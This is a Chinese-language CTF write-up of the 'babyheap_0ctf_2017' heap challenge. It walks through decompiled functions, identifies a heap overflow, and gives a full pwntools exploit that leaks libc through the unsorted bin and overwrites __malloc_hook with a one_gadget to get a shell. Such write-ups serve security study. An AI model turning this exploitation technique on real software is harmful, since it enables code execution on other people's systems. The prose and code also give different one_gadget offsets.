# babyheap_0ctf_2017

[题目地址](https://buuoj.cn/challenges#babyheap_0ctf_2017)

我学不会堆啊，我真的看不懂堆啊！！！

```
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

太好了一看我就不会。提前备好[wp](https://cloud.tencent.com/developer/article/1764339)，冲。

```c
undefined8 Main(void)

{
  undefined8 heap;
  undefined8 uVar1;
  
  heap = MallocHeap();
  do {
    PrintMenu();
    uVar1 = GetInput();
    switch(uVar1) {
    case 1:
      Allocate(heap);
      break;
    case 2:
      Fill(heap);
      break;
    case 3:
      Free(heap);
      break;
    case 4:
      Dump(heap);
      break;
    case 5:
      return 0;
    }
  } while( true );
}
```

heap4件套，分配，填充，释放和打印。一个一个看一下。

```c
void Allocate(long heap)

{
  void *pvVar1;
  uint local_18;
  int size;
  
  local_18 = 0;
  while( true ) {
    if (0xf < (int)local_18) {
      return;
    }
    if (*(int *)(heap + (long)(int)local_18 * 0x18) == 0) break;
    local_18 = local_18 + 1;
  }
  printf("Size: ");
  size = GetInput();
  if (size < 1) {
    return;
  }
  if (0x1000 < size) {
    size = 0x1000;
  }
  pvVar1 = calloc((long)size,1);
  if (pvVar1 != (void *)0x0) {
    *(undefined4 *)(heap + (long)(int)local_18 * 0x18) = 1;
    *(long *)((long)(int)local_18 * 0x18 + heap + 8) = (long)size;
    *(void **)((long)(int)local_18 * 0x18 + heap + 0x10) = pvVar1;
    printf("Allocate Index %d\n",(ulong)local_18);
    return;
  }
                    /* WARNING: Subroutine does not return */
  exit(-1);
}
```

这个heap的构造还算简单，malloc的堆块前8位值是0x1，估计是标识当前chunk是否被使用的；16位是大小；24位是实际存储内容的堆块。就把每个堆块看成一个数组，chunk[0]=1,chunk[1]=size,chunk[2]=heap_chunk(content)。没啥毛病。

```c
void Fill(long param_1)

{
  int index;
  int iVar1;
  
  printf("Index: ");
  index = GetInput();
  if (((-1 < index) && (index < 0x10)) && (*(int *)(param_1 + (long)index * 0x18) == 1)) {
    printf("Size: ");
    iVar1 = GetInput();
    if (0 < iVar1) {
      printf("Content: ");
      FillHeapContents(*(undefined8 *)(param_1 + (long)index * 0x18 + 0x10),(long)iVar1);
    }
  }
  return;
}
```

它是不是又问了我们一遍size？出大问题，allocate已经规定好size了，又问一遍就是摆上来给你溢出。

```c
void Free(long param_1)

{
  int iVar1;
  
  printf("Index: ");
  iVar1 = GetInput();
  if (((-1 < iVar1) && (iVar1 < 0x10)) && (*(int *)(param_1 + (long)iVar1 * 0x18) == 1)) {
    *(undefined4 *)(param_1 + (long)iVar1 * 0x18) = 0;
    *(undefined8 *)(param_1 + (long)iVar1 * 0x18 + 8) = 0;
    free(*(void **)(param_1 + (long)iVar1 * 0x18 + 0x10));
    *(undefined8 *)(param_1 + (long)iVar1 * 0x18 + 0x10) = 0;
  }
  return;
}
```

没有uaf。

```c
void Dump(long param_1)

{
  int iVar1;
  
  printf("Index: ");
  iVar1 = GetInput();
  if (((-1 < iVar1) && (iVar1 < 0x10)) && (*(int *)(param_1 + (long)iVar1 * 0x18) == 1)) {
    puts("Content: ");
    PrintHeapContents(*(undefined8 *)(param_1 + (long)iVar1 * 0x18 + 0x10),
                      *(undefined8 *)(param_1 + (long)iVar1 * 0x18 + 8));
    puts("");
  }
  return;
}
```

常规输出。看一圈下来只有fill函数有大漏洞。怎么利用呢？不得不提到经典的[fastbin attack](https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/fastbin-attack/)了。放exp逐步分析。

```python
from pwn import *
 
context.log_level = "debug"
 
p = remote("node4.buuoj.cn",27950)
 
def alloc(size):
    p.recvuntil("Command: ")
    p.sendline("1")
    p.recvuntil("Size: ")
    p.sendline(str(size))
 
def fill(idx, content):
    p.recvuntil("Command: ")
    p.sendline("2")
    p.recvuntil("Index: ")
    p.sendline(str(idx))
    p.recvuntil("Size: ")
    p.sendline(str(len(content)))
    p.recvuntil("Content: ")
    p.send(content)
 
def free(idx):
    p.recvuntil("Command: ")
    p.sendline("3")
    p.recvuntil("Index: ")
    p.sendline(str(idx))
 
def dump(idx):
    p.recvuntil("Command: ")
    p.sendline("4")
    p.recvuntil("Index: ")
    p.sendline(str(idx))
    p.recvline()
    return p.recvline()
 
 
alloc(0x10)
alloc(0x10)
alloc(0x10)
alloc(0x10)
alloc(0x80)
 
free(1)
free(2)
 
payload = p64(0)*3
payload += p64(0x21)
payload += p64(0)*3
payload += p64(0x21)
payload += p8(0x80)
fill(0, payload)
 
payload = p64(0)*3
payload += p64(0x21)
fill(3, payload)
 
alloc(0x10)
alloc(0x10)
 
payload = p64(0)*3
payload += p64(0x91)
fill(3, payload)
alloc(0x80)
free(4)
 
libc_base = u64(dump(2)[:8].strip().ljust(8, b"\x00"))-0x3c4b78
log.info("libc_base: "+hex(libc_base))
 
alloc(0x60)
free(4)
 
payload = p64(libc_base+0x3c4aed)
fill(2, payload)
 
alloc(0x60)
alloc(0x60)
 
payload = p8(0)*3
payload += p64(0)*2
payload += p64(libc_base+0x4526a)
fill(6, payload)
 
alloc(255)
 
p.interactive()
```

```python
alloc(0x10)
alloc(0x10)
alloc(0x10)
alloc(0x10)
alloc(0x80)
 
free(1)
free(2)
```

第一步，来5个chunk，按照索引叫它们，分别为chunk0-4。chunk0-3都是fastbin大小0x10，唯独chunk4是unsorted bin大小0x80。chunk4在后面有大用途，不过现在我们要做的仅仅是free chunk1和chunk2而已。回想fastbin的知识，fastbin中会形成一个单链表，chunk1->chunk2，chunk2的fd是chunk1。fastbin还有个好处，就是它不会合并，放心用。接下来开始搞事情，先问个问题，堆溢出溢出的是哪里？答案是与其物理相邻的下一个 chunk 的内容。包括：

```
prev_size
size，主要有三个比特位，以及该堆块真正的大小。
NON_MAIN_ARENA
IS_MAPPED
PREV_INUSE
the True chunk size
chunk content，从而改变程序固有的执行流
```

记住是下一个chunk，不是当前chunk，把它刻到你的dna里。当然在这道题里面可溢出的大小可控，覆盖下下个chunk也没问题。现在我们要做的正是如此，使用fill函数填充chunk0，一直覆盖到chunk2，更改chunk2的fd。

```python
payload = p64(0)*3
payload += p64(0x21)
payload += p64(0)*3
payload += p64(0x21)
payload += p8(0x80)
fill(0, payload)
```

至于为什么这么填，都是调试加上[堆结构](https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/heap-structure/)（prev_size,size和chunk_content)决定的，wp里有详细截图。或许用个例子能更好演示覆盖的是哪里。和这题没关系，但是结构一样，这是chunk被覆盖前：

```
0x602000:   0x0000000000000000  0x0000000000000021 <===chunk
0x602010:   0x0000000000000000  0x0000000000000000
0x602020:   0x0000000000000000  0x0000000000020fe1 <===top chunk
0x602030:   0x0000000000000000  0x0000000000000000
0x602040:   0x0000000000000000  0x0000000000000000
```

chunk从0x602000开始。填入100个A后变成这样：

```
0x602000:   0x0000000000000000  0x0000000000000021 <===chunk
0x602010:   0x4141414141414141  0x4141414141414141
0x602020:   0x4141414141414141  0x4141414141414141 <===top chunk(已被溢出)
0x602030:   0x4141414141414141  0x4141414141414141
0x602040:   0x4141414141414141  0x4141414141414141
```

从size的下一个开始填入。这样对比着加上wp的截图就知道怎么溢出的了。最后的p8是为了覆盖chunk2的fd的一个高位，使其指向chunk4。更改其fd为chunk4后，chunk4也在fastbin链表里了，虽然它根本没有被free。chunk4的大小是0x80，这不是fastbin的大小啊，肯定会被系统看出来。于是我们把chunk4的size改成0x21。

```python
payload = p64(0)*3
payload += p64(0x21)
fill(3, payload)
```

现在万无一失，让我们allocate两个chunk，第一个是chunk2，但是第二个却是chunk4了，因为我们更改了chunk2的fd，让fastbin把chunk2拿出后链表中下一个待命的是chunk4。虽然fastbin malloc时会检查被malloc的chunk大小是否符合fastbin，但是我们改过了，成功得到chunk4。

```pyhton
alloc(0x10)
alloc(0x10)
```

可是原本的chunk4没有被free啊，怎么我们又有了一个chunk4？确实如此，现在index 2和4指向的都是chunk4。这是很多堆题泄露地址的关键，让多个指针指向同一个chunk，这样在其中一个指针被free后chunk所得到的重要信息可以被另一个指针获取。chunk4本来就属于unsorted bin，让我们把它的size改回来，接着free，就能将其放入unsorted bin。

```python
payload = p64(0)*3
payload += p64(0x91)
fill(3, payload)
alloc(0x80)
free(4)

libc_base = u64(dump(2)[:8].strip().ljust(8, b"\x00"))-0x3c4b78
log.info("libc_base: "+hex(libc_base))
```

做了这么多就是为了把chunk4放进unsorted bin？因为我们需要[利用unsorted bin泄露地址](https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/unsorted-bin-attack/)。

- unsortbin 有一个特性，就是如果 usortbin 只有一个 bin ，它的 fd 和 bk 指针会指向同一个地址(unsorted bin 链表的头部），这个地址为 main_arena + 0x58 ，而且 main_arena 又相对 libc 固定偏移 0x3c4b20 ，
所以我们得到fd的值，然后再减去0x58再减去main_arena相对于libc的固定偏移，即得到libc的基地址。所以我们需要把 chunk 改成大于 fastbin 的大小，这样 free 后能进入 unsortbin 让我们能够泄露 libc 基址。同时free(4)前还要alloc一个chunk，让top chunk在chunk4被free时不会互相合并。

现在chunk4的fd中有着我们想要的main_arena地址。这个信息只有在chunk4被free后才会出现，正常只有一个指针指向chunk4的情况下是不可能能泄露地址的，但是我们让index 2也指向了chunk4！回忆chunk结构，一个chunk的content域和fd是重叠的，是什么仅取决于是不是free状态。现在chunk4 free了，dump(2)打印chunk4的content，其实就是它的fd，得到main_arena，从而算出基地址。

接下来我们alloc(0x60)，输入fastbin范围，因为unsorted bin中有更大的chunk，所以程序会把刚刚free掉的chunk4切出0x60的大小分配给我们。这是我们至此alloc的第6个chunk，叫chunk6，因为其索引还是4，不能再用索引命名了。然后free(4)其实是free chunk6，使其加入fastbin链表。编辑索引2即chunk2时可以更改其fd。

```python
alloc(0x60)
free(4)
```

最后一步，更改__malloc_hook为one_gadget。根据wp截图找一下__malloc_hook在哪和其周围的内存，选一个靠近__malloc_hook的地方分配。不过这个地方有讲究，为了绕过malloc的检测，要利用字节错位使size位在fastbin范围内。最后发现0x7fd25e3b7aed，0x7f正好。算出该地址对libc的基址的偏移是0x3c4aed。fill(2,payload)修改chunk6的fd，第一个allocate(0x60)会得到chunk6，第二个allocate就能拿到chunk6的fd所指向的位置了。此时所指位置的索引是6，编辑6即可编辑__malloc_hook的内存。

```python
payload = p64(libc_base+0x3c4aed)
fill(2, payload)
 
alloc(0x60)
alloc(0x60)
```

把__malloc_hook改成one_gadget（libc_base+0x4527a），p8(0)\*3和p64(0)\*2用来内存对齐。最后再alloc即可getshell。

```python
payload = p8(0)*3
payload += p64(0)*2
payload += p64(libc_base+0x4526a)
fill(6, payload)
 
alloc(255)
 
p.interactive()
```